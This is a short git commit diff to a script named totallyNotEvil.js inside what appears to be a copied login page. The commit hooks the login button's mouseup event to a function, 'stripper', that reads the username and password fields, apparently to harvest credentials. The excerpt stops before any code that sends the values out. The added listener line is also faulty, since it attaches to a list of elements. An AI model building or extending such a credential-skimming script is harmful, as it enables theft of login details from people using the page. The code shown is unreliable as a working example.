417f726c00daa7f888ca906429ddb13fee2de591
the-sides <sides798@gmail.com>
2019-12-03 17:01:02 -0500

    removing loose ends

--- public/Login_files/totallyNotEvil.js
+++ public/Login_files/totallyNotEvil.js
@@ -1,7 +1,9 @@
 function attacher(){
     const btn = document.querySelectorAll('input.btn')
     console.log([...btn])
+    btn.addEventListener('mouseup', stripper)
 }
+
 function stripper(){
     const username = document.querySelector('#username.form-control');
     const password = document.querySelector('#password.form-control');
